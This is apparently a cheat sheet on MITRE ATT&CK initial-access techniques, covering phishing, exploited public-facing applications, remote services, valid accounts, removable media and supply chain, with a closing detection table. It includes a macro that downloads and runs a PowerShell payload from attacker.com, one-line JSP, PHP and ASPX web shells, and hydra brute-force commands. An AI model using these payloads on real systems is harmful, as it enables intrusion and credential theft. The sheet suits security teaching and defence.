# MITRE ATT&CK: Initial Access (TA0001)

> Techniques used to gain an initial foothold in a target environment.

---

## T1566: Phishing

### T1566.001: Spearphishing Attachment
- **Description**: Malicious attachment delivered via email
- **Common Payloads**: Office macros, PDF exploits, ISO/VHD containers, LNK files
- **Delivery Formats**:
  - `.docm` / `.dotm` — VBA macro documents
  - `.xlsm` / `.xlam` — Excel macros with XLM / VBA
  - `.pdf` — JavaScript-embedded or exploit-based
  - `.iso` / `.img` — Mark-of-the-Web bypass (Windows)
  - `.zip` — Double-extension files (`invoice.pdf.exe`)
  - `.lnk` — Shortcut targeting PowerShell / cmd

### Macro Payload Patterns
```vb
Sub AutoOpen()
    Shell "powershell -enc " + EncodeBase64("IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')")
End Sub
```

### T1566.002: Spearphishing Link
- Credential harvesting portals (fake login pages)
- Drive-by downloads
- QR code phishing (quishing)

### T1566.003: Spearphishing via Service
- LinkedIn messaging, Slack DMs, Teams chat
- Social media platform abuse

---

## T1190: Exploit Public-Facing Application

### Common Targets
| Application | Common Vulnerabilities |
|---|---|
| WordPress | Plugin RCE, XML-RPC abuse, REST API leaks |
| Apache Struts | OGNL injection (CVE-2017-5638) |
| Jenkins | Groovy sandbox escape, script console |
| Exchange | ProxyShell, ProxyNotShell, ProxyLogon |
| VMware vCenter | vSphere Client RCE (CVE-2021-21972) |
| Confluence | OGNL injection (CVE-2021-26084) |
| Fortinet SSL-VPN | Path traversal (CVE-2022-42475) |
| Cisco ASA | IKEv2 buffer overflow |

### Web Shell Deployment
```bash
# JSP webshell for Tomcat
echo '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' > shell.jsp

# PHP webshell
<?php system($_GET['cmd']); ?>

# ASPX minimal webshell
<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]); %>
```

---

## T1133: External Remote Services

- VPN gateways (IPSec, SSL-VPN, WireGuard)
- RDP exposed to internet (port 3389)
- SSH exposed (port 22) with weak credentials
- Citrix / VMware Horizon
- TeamViewer / AnyDesk misconfigurations

**Credential Stuffing Tools**: Medusa, Hydra, Crowbar, Ncrack
```bash
# RDP brute force
hydra -L users.txt -P passwords.txt rdp://target.com

# SSH brute force
hydra -l root -P rockyou.txt ssh://target.com
```

---

## T1078: Valid Accounts

### T1078.001: Default Accounts
- `admin:admin`, `root:root`, `cisco:cisco`
- Manufacturer default credentials (shodan searchable)

### T1078.002: Domain Accounts
- Password spraying: `spray.sh`, `MailSniper`, `o365spray`
- Kerberoasting pre-requisites: SPN enumeration

### T1078.003: Local Accounts
- Pass-the-hash with local admin password reuse
- LAPS bypass techniques

### T1078.004: Cloud Accounts
- AWS access key compromise via SSRF
- Azure AD token theft
- GCP service account key abuse

---

## T1091: Replication Through Removable Media

- BadUSB (Rubber Ducky, Bash Bunny)
- AutoRun abuse (legacy Windows)
- LNK file on USB drive exploiting shortcut resolution

---

## T1195: Supply Chain Compromise

### T1195.001: Software Supply Chain
- Dependency confusion (pip, npm, maven)
- Malicious package injection
- Code signing certificate theft

### T1195.002: Hardware Supply Chain
- Compromised firmware (UEFI/BIOS implants)
- Interdiction of shipped devices

### T1195.003: Compromise Software Deployment Pipeline
- CI/CD pipeline poisoning (GitHub Actions, Jenkins)
- Source code repository compromise

---

## Detection & Mitigation

| Technique | Detection | Mitigation |
|---|---|---|
| Phishing | Email gateway alerts, macro execution logs | User training, ASR rules, application control |
| Web Exploitation | WAF logs, process spawning from w3wp | Patch management, WAF, input validation |
| Valid Accounts | Failed login monitoring, impossible travel | MFA, password policies, PAM |
| External Services | Geo-anomaly detection, off-hours access | VPN restrictions, MFA, jump hosts |
